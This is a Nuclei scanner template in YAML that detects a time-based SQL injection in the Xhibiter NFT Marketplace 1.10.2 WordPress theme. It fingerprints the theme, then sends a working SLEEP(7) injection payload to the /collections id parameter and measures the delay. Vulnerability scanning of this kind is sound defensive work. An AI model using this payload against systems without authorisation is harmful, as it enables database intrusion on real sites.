flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - /wp-content/themes/xhibiter/
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - duration>=7
    type: dsl
  matchers-condition: and
  raw:
  - 'GET /collections?id=2''+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+''KEOa''=''KEOa
    HTTP/1.1

    Host: {{Hostname}}

    '
id: xhibiter-nft-sqli
info:
  author: ProjectDiscoveryAI
  description: 'The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL
    Injection vulnerability. This allows an attacker to manipulate SQL queries by
    injecting malicious SQL code through vulnerable input fields.

    '
  metadata:
    max-request: 2
    publicwww-query: /wp-content/themes/xhibiter/
  name: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
  reference:
  - https://www.exploit-db.com/exploits/52060
  - https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/
  - https://x.com/ExploitDB/status/1807782485549560196
